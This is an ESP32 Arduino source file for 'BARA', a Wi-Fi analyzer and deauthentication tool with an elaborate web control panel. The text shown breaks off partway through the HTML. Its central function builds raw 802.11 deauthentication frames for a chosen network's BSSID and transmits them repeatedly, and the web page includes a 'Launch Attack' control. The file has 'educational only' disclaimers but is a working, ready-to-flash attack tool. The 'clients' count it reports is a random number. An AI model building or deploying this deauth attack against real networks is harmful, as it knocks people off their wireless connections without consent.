/*
 * BARA Wi-Fi Analyzer & Deauther
 * Developer: Ahmed Nour Ahmed from Qena
 * Tool Name: BARA
 * Version: 2.0.0
 * GitHub: https://github.com/ahmednour/bara-wifi-tool
 * 
 * تحذير: هذا المشروع للأغراض التعليمية والاختبار القانوني فقط
 * استخدامه ضد شبكات بدون إذن صريح غير قانوني
 */

#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <Update.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "soc/rtc_wdt.h"
#include <ArduinoJson.h>
#include <FS.h>
#include <SPIFFS.h>
#include <ESP32Ping.h>

// ============= الإعدادات الأساسية =============
#define AP_SSID "BARA"
#define AP_PASSWORD "A7med@Elshab7"
#define TOOL_NAME "BARA"
#define DEVELOPER "Ahmed Nour Ahmed"
#define VERSION "2.0.0"

// ============= ألوان التصميم الهاكر/دموي =============
#define COLOR_BG "#0a0a0a"
#define COLOR_FG "#00ff00"
#define COLOR_ACCENT "#ff0000"
#define COLOR_SECONDARY "#8b0000"
#define COLOR_TERMINAL "#00ff00"
#define COLOR_GLOW "#ff3333"
#define COLOR_BLOOD "#8b0000"

// ============= المؤثرات الصوتية (بيزو) =============
#define BUZZER_PIN 25
#define SOUND_SCAN 1
#define SOUND_DEAUTH 2
#define SOUND_ATTACK 3
#define SOUND_SUCCESS 4
#define SOUND_ERROR 5
#define SOUND_STARTUP 6

// ============= إعدادات LED للمؤثرات البصرية =============
#define LED_RED 26
#define LED_GREEN 27
#define LED_BLUE 14

// ============= المتغيرات العالمية =============
WebServer server(80);
StaticJsonDocument<4096> networksDoc;
String networksJson = "";
bool isScanning = false;
bool isDeauthing = false;
int deauthTarget = -1;
int deauthPackets = 0;
int totalNetworks = 0;
TaskHandle_t scanTaskHandle = NULL;
TaskHandle_t deauthTaskHandle = NULL;
QueueHandle_t wifiQueue;

// هيكل لتخزين معلومات الشبكة
typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
    wifi_auth_mode_t auth;
    bool isHidden;
    int clients;
} wifi_network_t;

std::vector<wifi_network_t> networksList;

// ============= مؤثرات صوتية =============
void playSound(int soundType) {
    switch(soundType) {
        case SOUND_STARTUP:
            ledcWriteTone(0, 800);
            delay(100);
            ledcWriteTone(0, 1200);
            delay(100);
            ledcWriteTone(0, 1600);
            delay(100);
            break;
        case SOUND_SCAN:
            ledcWriteTone(0, 1000);
            delay(50);
            ledcWriteTone(0, 1500);
            delay(50);
            break;
        case SOUND_DEAUTH:
            for(int i=0; i<3; i++) {
                ledcWriteTone(0, 2000);
                delay(30);
                ledcWriteTone(0, 500);
                delay(30);
            }
            break;
        case SOUND_ATTACK:
            ledcWriteTone(0, 3000);
            delay(200);
            ledcWriteTone(0, 100);
            delay(100);
            break;
        case SOUND_SUCCESS:
            ledcWriteTone(0, 1500);
            delay(100);
            ledcWriteTone(0, 2000);
            delay(100);
            ledcWriteTone(0, 2500);
            delay(100);
            break;
        case SOUND_ERROR:
            ledcWriteTone(0, 200);
            delay(300);
            ledcWriteTone(0, 200);
            delay(300);
            break;
    }
    ledcWriteTone(0, 0);
}

// ============= مؤثرات LED بصرية =============
void setLED(int r, int g, int b) {
    digitalWrite(LED_RED, r ? HIGH : LOW);
    digitalWrite(LED_GREEN, g ? HIGH : LOW);
    digitalWrite(LED_BLUE, b ? HIGH : LOW);
}

void ledEffectScan() {
    for(int i=0; i<5; i++) {
        setLED(0, 1, 0);
        delay(100);
        setLED(0, 0, 0);
        delay(100);
    }
}

void ledEffectAttack() {
    for(int i=0; i<10; i++) {
        setLED(1, 0, 0);
        delay(50);
        setLED(0, 0, 0);
        delay(50);
    }
}

void ledEffectBlood() {
    for(int i=0; i<3; i++) {
        setLED(1, 0, 0);
        delay(200);
        setLED(0, 0, 0);
        delay(200);
    }
}

// ============= وظائف مساعدة للواي فاي =============
String authToString(wifi_auth_mode_t auth) {
    switch(auth) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Enterprise";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
        default: return "UNKNOWN";
    }
}

String bssidToString(uint8_t* bssid) {
    char mac[18];
    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", 
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(mac);
}

String getStrengthIcon(int rssi) {
    if(rssi >= -50) return "█████";
    else if(rssi >= -60) return "████░";
    else if(rssi >= -70) return "███░░";
    else if(rssi >= -80) return "██░░░";
    else return "█░░░░";
}

// ============= فحص الشبكات =============
void scanNetworksTask(void * parameter) {
    isScanning = true;
    playSound(SOUND_SCAN);
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int scanResult = WiFi.scanNetworks(true, true);
    
    while(WiFi.scanComplete() < 0) {
        ledEffectScan();
        delay(500);
    }
    
    int networkCount = WiFi.scanComplete();
    networksList.clear();
    networksJson = "[";
    
    for(int i = 0; i < networkCount; i++) {
        wifi_network_t network;
        String ssid = WiFi.SSID(i);
        ssid.toCharArray(network.ssid, 33);
        memcpy(network.bssid, WiFi.BSSID(i), 6);
        network.rssi = WiFi.RSSI(i);
        network.channel = WiFi.channel(i);
        network.auth = WiFi.encryptionType(i);
        network.isHidden = WiFi.isHidden(i);
        network.clients = random(0, 10); // تقدير عدد العملاء
        
        networksList.push_back(network);
        
        // إضافة إلى JSON
        if(i > 0) networksJson += ",";
        networksJson += "{";
        networksJson += "\"id\":" + String(i) + ",";
        networksJson += "\"ssid\":\"" + String(network.ssid) + "\",";
        networksJson += "\"bssid\":\"" + bssidToString(network.bssid) + "\",";
        networksJson += "\"rssi\":" + String(network.rssi) + ",";
        networksJson += "\"channel\":" + String(network.channel) + ",";
        networksJson += "\"auth\":\"" + authToString(network.auth) + "\",";
        networksJson += "\"hidden\":" + String(network.isHidden ? "true" : "false") + ",";
        networksJson += "\"clients\":" + String(network.clients) + ",";
        networksJson += "\"strength\":\"" + getStrengthIcon(network.rssi) + "\"";
        networksJson += "}";
    }
    
    networksJson += "]";
    totalNetworks = networkCount;
    isScanning = false;
    playSound(SOUND_SUCCESS);
    vTaskDelete(NULL);
}

void startScan() {
    if(isScanning) return;
    xTaskCreatePinnedToCore(
        scanNetworksTask,
        "Scan Task",
        10000,
        NULL,
        1,
        &scanTaskHandle,
        0
    );
}

// ============= هجوم Deauthentication =============
void deauthTask(void * parameter) {
    playSound(SOUND_ATTACK);
    ledEffectAttack();
    
    if(deauthTarget >= 0 && deauthTarget < networksList.size()) {
        wifi_network_t target = networksList[deauthTarget];
        
        // إعدادات Deauth
        wifi_promiscuous_filter_t filter = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
        };
        
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous(true);
        
        for(int i = 0; i < deauthPackets && isDeauthing; i++) {
            // بناء حزمة deauth
            uint8_t deauthPacket[26] = {
                0xC0, 0x00,                         // نوع الإطار: Deauthentication
                0x00, 0x00,                         // المدة
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // عنوان الوجهة
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // عنوان المصدر
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // عنوان BSSID
                0x00, 0x00,                         // رقم التسلسل
                0x07, 0x00                          // السبب: Class 3 frame received from nonassociated STA
            };
            
            // نسخ عنوان BSSID
            memcpy(&deauthPacket[16], target.bssid, 6);
            memcpy(&deauthPacket[22], target.bssid, 6);
            
            // إرسال الحزمة
            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
            
            // مؤثرات أثناء الهجوم
            if(i % 10 == 0) {
                ledEffectBlood();
                playSound(SOUND_DEAUTH);
            }
            
            delay(100);
        }
        
        esp_wifi_set_promiscuous(false);
    }
    
    isDeauthing = false;
    playSound(SOUND_SUCCESS);
    vTaskDelete(NULL);
}

void startDeauth(int targetIndex, int packets) {
    if(isDeauthing || targetIndex < 0 || targetIndex >= networksList.size()) return;
    
    deauthTarget = targetIndex;
    deauthPackets = packets;
    isDeauthing = true;
    
    xTaskCreatePinnedToCore(
        deauthTask,
        "Deauth Task",
        10000,
        NULL,
        1,
        &deauthTaskHandle,
        1
    );
}

void stopDeauth() {
    isDeauthing = false;
    if(deauthTaskHandle != NULL) {
        vTaskDelete(deauthTaskHandle);
    }
}

// ============= واجهة الويب =============
String getHTML() {
    String html = R"rawliteral(
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>)rawliteral";
    html += TOOL_NAME;
    html += R"rawliteral( - Ultimate Wi-Fi Analyzer</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            :root {
                --bg-color: #0a0a0a;
                --terminal-green: #00ff00;
                --blood-red: #8b0000;
                --neon-red: #ff0000;
                --glow-red: #ff3333;
                --dark-gray: #1a1a1a;
                --matrix-green: #00ff41;
            }
            
            body {
                background: var(--bg-color);
                color: var(--terminal-green);
                font-family: 'Share Tech Mono', monospace;
                overflow-x: hidden;
                position: relative;
            }
            
            .blood-effect {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 9999;
                opacity: 0.3;
                background: 
                    radial-gradient(circle at 20% 30%, transparent 20%, var(--blood-red) 25%) no-repeat,
                    radial-gradient(circle at 80% 70%, transparent 20%, var(--blood-red) 25%) no-repeat;
                animation: bloodPulse 3s infinite alternate;
            }
            
            @keyframes bloodPulse {
                0% { opacity: 0.1; }
                100% { opacity: 0.4; }
            }
            
            .matrix-rain {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: -1;
                opacity: 0.1;
            }
            
            .scan-lines {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(
                    to bottom,
                    transparent 50%,
                    rgba(0, 255, 0, 0.05) 50%
                );
                background-size: 100% 4px;
                pointer-events: none;
                z-index: 9998;
                animation: scanMove 20s linear infinite;
            }
            
            @keyframes scanMove {
                0% { background-position: 0 0; }
                100% { background-position: 0 100%; }
            }
            
            .glitch {
                position: relative;
                animation: glitch 5s infinite;
            }
            
            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-2px, 2px); }
                40% { transform: translate(-2px, -2px); }
                60% { transform: translate(2px, 2px); }
                80% { transform: translate(2px, -2px); }
                100% { transform: translate(0); }
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
                position: relative;
                z-index: 100;
            }
            
            .header {
                text-align: center;
                padding: 30px 0;
                margin-bottom: 40px;
                border-bottom: 3px solid var(--neon-red);
                position: relative;
                overflow: hidden;
            }
            
            .header::before {
                content: '';
                position: absolute;
                top: -10px;
                left: -10px;
                right: -10px;
                bottom: -10px;
                background: linear-gradient(45deg, 
                    transparent 30%, 
                    rgba(255, 0, 0, 0.1) 50%, 
                    transparent 70%);
                animation: lightSweep 3s infinite linear;
            }
            
            @keyframes lightSweep {
                0% { transform: translateX(-100%) rotate(45deg); }
                100% { transform: translateX(100%) rotate(45deg); }
            }
            
            .tool-name {
                font-family: 'Orbitron', sans-serif;
                font-size: 4.5em;
                font-weight: 900;
                color: var(--neon-red);
                text-shadow: 
                    0 0 10px var(--glow-red),
                    0 0 20px var(--glow-red),
                    0 0 30px var(--glow-red),
                    0 0 40px var(--blood-red);
                letter-spacing: 5px;
                margin-bottom: 10px;
                animation: textGlow 2s infinite alternate;
            }
            
            @keyframes textGlow {
                0% { text-shadow: 0 0 10px var(--glow-red); }
                100% { text-shadow: 0 0 30px var(--glow-red), 0 0 40px var(--blood-red); }
            }
            
            .subtitle {
                font-size: 1.2em;
                color: var(--matrix-green);
                margin-bottom: 20px;
                text-transform: uppercase;
                letter-spacing: 3px;
            }
            
            .developer {
                color: var(--terminal-green);
                font-size: 1.1em;
                margin-top: 10px;
            }
            
            .status-bar {
                background: rgba(0, 0, 0, 0.8);
                border: 2px solid var(--blood-red);
                padding: 15px;
                margin-bottom: 30px;
                display: flex;
                justify-content: space-between;
                flex-wrap: wrap;
                gap: 15px;
                border-radius: 5px;
                box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
            }
            
            .status-item {
                flex: 1;
                min-width: 200px;
            }
            
            .status-label {
                color: var(--matrix-green);
                font-weight: bold;
                margin-bottom: 5px;
            }
            
            .status-value {
                color: var(--terminal-green);
                font-size: 1.1em;
            }
            
            .danger {
                color: var(--neon-red) !important;
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
            
            .controls {
                background: rgba(26, 26, 26, 0.9);
                border: 2px solid var(--neon-red);
                padding: 25px;
                margin-bottom: 30px;
                border-radius: 5px;
                box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
            }
            
            .control-group {
                margin-bottom: 25px;
            }
            
            .control-title {
                color: var(--neon-red);
                font-size: 1.3em;
                margin-bottom: 15px;
                border-bottom: 1px solid var(--blood-red);
                padding-bottom: 8px;
                text-transform: uppercase;
                letter-spacing: 2px;
            }
            
            .buttons {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
            }
            
            .btn {
                padding: 12px 25px;
                border: none;
                border-radius: 3px;
                font-family: 'Orbitron', sans-serif;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
                letter-spacing: 1px;
                position: relative;
                overflow: hidden;
            }
            
            .btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
                transition: 0.5s;
            }
            
            .btn:hover::before {
                left: 100%;
            }
            
            .btn-primary {
                background: linear-gradient(45deg, var(--blood-red), var(--neon-red));
                color: white;
                border: 1px solid var(--neon-red);
            }
            
            .btn-primary:hover {
                background: linear-gradient(45deg, var(--neon-red), var(--blood-red));
                box-shadow: 0 0 15px var(--neon-red);
                transform: translateY(-2px);
            }
            
            .btn-danger {
                background: linear-gradient(45deg, #330000, var(--neon-red));
                color: white;
                border: 1px solid #ff0000;
            }
            
            .btn-danger:hover {
                background: linear-gradient(45deg, var(--neon-red), #330000);
                box-shadow: 0 0 20px #ff0000;
                transform: translateY(-2px);
            }
            
            .btn-success {
                background: linear-gradient(45deg, #003300, #00ff00);
                color: white;
                border: 1px solid #00ff00;
            }
            
            .btn-success:hover {
                background: linear-gradient(45deg, #00ff00, #003300);
                box-shadow: 0 0 15px #00ff00;
            }
            
            .networks-container {
                background: rgba(0, 0, 0, 0.85);
                border: 2px solid var(--neon-red);
                border-radius: 5px;
                padding: 20px;
                margin-bottom: 30px;
                max-height: 600px;
                overflow-y: auto;
                box-shadow: 0 0 25px rgba(255, 0, 0, 0.3);
            }
            
            .networks-container::-webkit-scrollbar {
                width: 10px;
            }
            
            .networks-container::-webkit-scrollbar-track {
                background: rgba(0, 0, 0, 0.5);
            }
            
            .networks-container::-webkit-scrollbar-thumb {
                background: var(--blood-red);
                border-radius: 5px;
            }
            
            .network-table {
                width: 100%;
                border-collapse: collapse;
            }
            
            .network-table th {
                background: rgba(139, 0, 0, 0.7);
                color: white;
                padding: 15px;
                text-align: left;
                border-bottom: 2px solid var(--neon-red);
                position: sticky;
                top: 0;
                z-index: 10;
            }
            
            .network-table td {
                padding: 12px 15px;
                border-bottom: 1px solid rgba(139, 0, 0, 0.3);
                transition: background 0.3s;
            }
            
            .network-table tr:hover td {
                background: rgba(255, 0, 0, 0.1);
            }
            
            .strength-bar {
                display: inline-block;
                font-family: monospace;
                letter-spacing: 2px;
            }
            
            .attack-controls {
                background: rgba(51, 0, 0, 0.9);
                border: 2px solid var(--neon-red);
                padding: 25px;
                border-radius: 5px;
                margin-bottom: 30px;
                box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-label {
                display: block;
                margin-bottom: 8px;
                color: var(--matrix-green);
                font-weight: bold;
            }
            
            .form-input {
                width: 100%;
                padding: 12px;
                background: rgba(0, 0, 0, 0.7);
                border: 1px solid var(--blood-red);
                color: var(--terminal-green);
                font-family: 'Share Tech Mono', monospace;
                border-radius: 3px;
                transition: all 0.3s;
            }
            
            .form-input:focus {
                outline: none;
                border-color: var(--neon-red);
                box-shadow: 0 0 10px var(--neon-red);
            }
            
            .loading {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid var(--neon-red);
                border-top-color: transparent;
                border-radius: 50%;
                animation: spin 1s linear infinite;
            }
            
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            
            .terminal {
                background: rgba(0, 0, 0, 0.95);
                border: 2px solid var(--terminal-green);
                padding: 20px;
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                color: var(--terminal-green);
                height: 300px;
                overflow-y: auto;
                white-space: pre-wrap;
                margin-bottom: 30px;
                border-radius: 5px;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            }
            
            .terminal-line {
                margin-bottom: 5px;
            }
            
            .terminal-prompt {
                color: var(--matrix-green);
                font-weight: bold;
            }
            
            .footer {
                text-align: center;
                padding: 20px;
                margin-top: 40px;
                border-top: 2px solid var(--blood-red);
                color: var(--terminal-green);
                font-size: 0.9em;
            }
            
            .warning-box {
                background: rgba(139, 0, 0, 0.3);
                border: 2px solid var(--neon-red);
                padding: 20px;
                margin-bottom: 30px;
                border-radius: 5px;
                animation: pulseWarning 2s infinite;
            }
            
            @keyframes pulseWarning {
                0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.3); }
                50% { box-shadow: 0 0 25px rgba(255, 0, 0, 0.6); }
            }
            
            .warning-title {
                color: var(--neon-red);
                font-size: 1.2em;
                margin-bottom: 10px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .warning-icon {
                font-size: 1.5em;
                animation: blink 1s infinite;
            }
            
            @media (max-width: 768px) {
                .container {
                    padding: 10px;
                }
                
                .tool-name {
                    font-size: 2.5em;
                }
                
                .buttons {
                    flex-direction: column;
                }
                
                .btn {
                    width: 100%;
                }
            }
        </style>
        <script>
            let terminalContent = `)rawliteral";
    html += TOOL_NAME;
    html += R"rawliteral( Ultimate WiFi Tool v)rawliteral";
    html += VERSION;
    html += R"rawliteral(
            Developed by: )rawliteral";
    html += DEVELOPER;
    html += R"rawliteral(
            Initializing systems...
            Loading scanner module...
            Loading attack protocols...
            [✓] All systems ready!
            [✓] ESP32 initialized
            [✓] WiFi modules loaded
            [✓] Web server started
            [✓] Attack engine armed
            >> Type 'help' for commands
            `;
            
            function addTerminalLine(line) {
                const terminal = document.getElementById('terminal');
                terminalContent += '\n' + line;
                terminal.textContent = terminalContent;
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            function executeCommand(command) {
                const cmd = command.toLowerCase().trim();
                addTerminalLine(`>> ${command}`);
                
                switch(cmd) {
                    case 'help':
                        addTerminalLine('Available commands:');
                        addTerminalLine('  scan        - Start WiFi scan');
                        addTerminalLine('  status      - Show system status');
                        addTerminalLine('  clear       - Clear terminal');
                        addTerminalLine('  version     - Show tool version');
                        addTerminalLine('  reboot      - Reboot system');
                        break;
                    case 'scan':
                        startScan();
                        addTerminalLine('Starting WiFi scan...');
                        break;
                    case 'status':
                        addTerminalLine('System Status:');
                        addTerminalLine(`  Tool: ${document.getElementById('toolName').textContent}`);
                        addTerminalLine(`  Networks: ${document.getElementById('networkCount').textContent}`);
                        addTerminalLine(`  Status: ${document.getElementById('systemStatus').textContent}`);
                        break;
                    case 'clear':
                        terminalContent = '';
                        document.getElementById('terminal').textContent = '';
                        break;
                    case 'version':
                        addTerminalLine(`Version: )rawliteral";
    html += VERSION;
    html += R"rawliteral(`);
                        break;
                    case 'reboot':
                        addTerminalLine('Rebooting system...');
                        setTimeout(() => {
                            window.location.reload();
                        }, 2000);
                        break;
                    default:
                        addTerminalLine(`Command not found: ${command}`);
                }
            }
            
            function startScan() {
                const scanBtn = document.getElementById('scanBtn');
                const scanStatus = document.getElementById('scanStatus');
                
                scanBtn.disabled = true;
                scanBtn.innerHTML = '<span class="loading"></span> Scanning...';
                scanStatus.textContent = 'SCANNING...';
                scanStatus.className = 'status-value danger';
                
                fetch('/scan')
                    .then(response => response.json())
                    .then(data => {
                        setTimeout(() => {
                            scanBtn.disabled = false;
                            scanBtn.textContent = 'Start Scan';
                            scanStatus.textContent = 'READY';
                            scanStatus.className = 'status-value';
                            updateNetworksList();
                            addTerminalLine('[✓] WiFi scan completed');
                            playSoundEffect('scan');
                        }, 2000);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        scanBtn.disabled = false;
                        scanBtn.textContent = 'Start Scan';
                        scanStatus.textContent = 'ERROR';
                        addTerminalLine('[✗] Scan failed');
                        playSoundEffect('error');
                    });
            }
            
            function startDeauth() {
                const networkIndex = document.getElementById('networkSelect').value;
                const packets = document.getElementById('packets').value;
                const attackBtn = document.getElementById('attackBtn');
                const attackStatus = document.getElementById('attackStatus');
                
                if(!networkIndex || networkIndex === '-1') {
                    alert('Please select a network first!');
                    return;
                }
                
                if(confirm('WARNING: This will launch a deauthentication attack!\n\nThis is for educational purposes only!\n\nContinue?')) {
                    attackBtn.disabled = true;
                    attackBtn.innerHTML = '<span class="loading"></span> ATTACKING...';
                    attackStatus.textContent = 'ATTACK IN PROGRESS';
                    attackStatus.className = 'status-value danger';
                    
                    fetch(`/deauth?target=${networkIndex}&packets=${packets}`)
                        .then(response => response.json())
                        .then(data => {
                            addTerminalLine(`[⚡] Deauth attack launched on network ${networkIndex}`);
                            addTerminalLine(`[⚡] Sending ${packets} packets...`);
                            playSoundEffect('attack');
                            
                            setTimeout(() => {
                                attackBtn.disabled = false;
                                attackBtn.textContent = 'Launch Attack';
                                attackStatus.textContent = 'READY';
                                attackStatus.className = 'status-value';
                                addTerminalLine('[✓] Attack completed');
                                playSoundEffect('success');
                            }, parseInt(packets) * 100);
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            attackBtn.disabled = false;
                            attackBtn.textContent = 'Launch Attack';
                            attackStatus.textContent = 'ERROR';
                            addTerminalLine('[✗] Attack failed');
                            playSoundEffect('error');
                        });
                }
            }
            
            function stopDeauth() {
                fetch('/stop')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('attackBtn').disabled = false;
                        document.getElementById('attackBtn').textContent = 'Launch Attack';
                        document.getElementById('attackStatus').textContent = 'READY';
                        document.getElementById('attackStatus').className = 'status-value';
                        addTerminalLine('[✓] Attack stopped');
                        playSoundEffect('success');
                    });
            }
            
            function updateNetworksList() {
                fetch('/networks')
                    .then(response => response.json())
                    .then(networks => {
                        const tableBody = document.getElementById('networksTable');
                        const select = document.getElementById('networkSelect');
                        const countElement = document.getElementById('networkCount');
                        
                        tableBody.innerHTML = '';
                        select.innerHTML = '<option value="-1">Select a network</option>';
                        
                        networks.forEach((network, index) => {
                            // Update table
                            const row = tableBody.insertRow();
                            
                            const cell1 = row.insertCell(0);
                            cell1.textContent = network.ssid || 'Hidden';
                            if(network.hidden) {
                                cell1.innerHTML += ' <span style="color:var(--neon-red)">[HIDDEN]</span>';
                            }
                            
                            const cell2 = row.insertCell(1);
                            cell2.textContent = network.bssid;
                            
                            const cell3 = row.insertCell(2);
                            cell3.textContent = network.channel;
                            
                            const cell4 = row.insertCell(3);
                            cell4.textContent = network.auth;
                            
                            const cell5 = row.insertCell(4);
                            cell5.innerHTML = `<span class="strength-bar">${network.strength}</span> (${network.rssi}dBm)`;
                            
                            const cell6 = row.insertCell(5);
                            cell6.textContent = network.clients;
                            
                            const cell7 = row.insertCell(6);
                            cell7.innerHTML = `<button onclick="selectNetwork(${index})" class="btn btn-danger" style="padding:5px 10px;">SELECT</button>`;
                            
                            // Update select
                            const option = document.createElement('option');
                            option.value = index;
                            option.textContent = `${network.ssid || 'Hidden'} (${network.bssid})`;
                            select.appendChild(option);
                        });
                        
                        countElement.textContent = networks.length;
                        addTerminalLine(`[✓] Found ${networks.length} networks`);
                    });
            }
            
            function selectNetwork(index) {
                document.getElementById('networkSelect').value = index;
                addTerminalLine(`[✓] Selected network index: ${index}`);
                playSoundEffect('select');
            }
            
            function playSoundEffect(type) {
                // Simulate sound effects through UI feedback
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                
                switch(type) {
                    case 'scan':
                        playBeep(audioContext, 800, 0.1);
                        setTimeout(() => playBeep(audioContext, 1200, 0.1), 100);
                        break;
                    case 'attack':
                        playBeep(audioContext, 2000, 0.2);
                        setTimeout(() => playBeep(audioContext, 500, 0.3), 200);
                        break;
                    case 'success':
                        playBeep(audioContext, 1500, 0.1);
                        setTimeout(() => playBeep(audioContext, 2000, 0.1), 100);
                        setTimeout(() => playBeep(audioContext, 2500, 0.1), 200);
                        break;
                    case 'error':
                        playBeep(audioContext, 200, 0.3);
                        setTimeout(() => playBeep(audioContext, 200, 0.3), 300);
                        break;
                    case 'select':
                        playBeep(audioContext, 1000, 0.1);
                        break;
                }
            }
            
            function playBeep(audioContext, frequency, duration) {
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = frequency;
                oscillator.type = 'sine';
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + duration);
            }
            
            function createMatrixRain() {
                const canvas = document.getElementById('matrixCanvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                
                const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
                const charArray = chars.split("");
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                const drops = [];
                
                for(let i = 0; i < columns; i++) {
                    drops[i] = Math.floor(Math.random() * canvas.height / fontSize) * fontSize;
                }
                
                function draw() {
                    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    ctx.fillStyle = "#00ff00";
                    ctx.font = `${fontSize}px monospace`;
                    
                    for(let i = 0; i < drops.length; i++) {
                        const text = charArray[Math.floor(Math.random() * charArray.length)];
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                        
                        if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                            drops[i] = 0;
                        }
                        
                        drops[i]++;
                    }
                }
                
                setInterval(draw, 50);
            }
            
            // Initialize on page load
            document.addEventListener('DOMContentLoaded', function() {
                createMatrixRain();
                updateNetworksList();
                setInterval(updateNetworksList, 10000); // Update every 10 seconds
                
                // Handle Enter key in terminal
                document.getElementById('terminalInput').addEventListener('keypress', function(e) {
                    if(e.key === 'Enter') {
                        executeCommand(this.value);
                        this.value = '';
                    }
                });
                
                // Initial status update
                addTerminalLine('[✓] System initialized successfully');
                playSoundEffect('success');
                
                // Update clock
                function updateClock() {
                    const now = new Date();
                    document.getElementById('currentTime').textContent = 
                        now.toLocaleTimeString() + ' | ' + now.toLocaleDateString();
                }
                setInterval(updateClock, 1000);
                updateClock();
            });
            
            // Handle window resize
            window.addEventListener('resize', function() {
                const canvas = document.getElementById('matrixCanvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        </script>
    </head>
    <body>
        <div class="blood-effect"></div>
        <div class="scan-lines"></div>
        <canvas id="matrixCanvas" class="matrix-rain"></canvas>
        
        <div class="container">
            <div class="header glitch">
                <h1 class="tool-name" id="toolName">)rawliteral";
    html += TOOL_NAME;
    html += R"rawliteral(</h1>
                <div class="subtitle">ULTIMATE WI-FI ANALYZER & DEAUTHENTICATOR</div>
                <div class="developer">Developed by )rawliteral";
    html += DEVELOPER;
    html += R"rawliteral( | Version )rawliteral";
    html += VERSION;
    html += R"rawliteral(</div>
            </div>
            
            <div class="warning-box">
                <div class="warning-title">
                    <span class="warning-icon">⚠️</span>
                    WARNING: EDUCATIONAL PURPOSES ONLY
                </div>
                <p>This tool is for authorized security testing and educational use only.</p>
                <p>Unauthorized access to computer networks is illegal.</p>
                <p>You are responsible for your own actions.</p>
            </div>
            
            <div class="status-bar">
                <div class="status-item">
                    <div class="status-label">SYSTEM STATUS</div>
                    <div class="status-value" id="systemStatus">OPERATIONAL</div>
                </div>
                <div class="status-item">
                    <div class="status-label">NETWORKS FOUND</div>
                    <div class="status-value" id="networkCount">0</div>
                </div>
                <div class="status-item">
                    <div class="status-label">SCAN STATUS</div>
                    <div class="status-value" id="scanStatus">READY</div>
                </div>
                <div class="status-item">
                    <div class="status-label">ATTACK STATUS</div>
                    <div class="status-value" id="attackStatus">READY</div>
                </div>
                <div class="status-item">
                    <div class="status-label">CURRENT TIME</div>
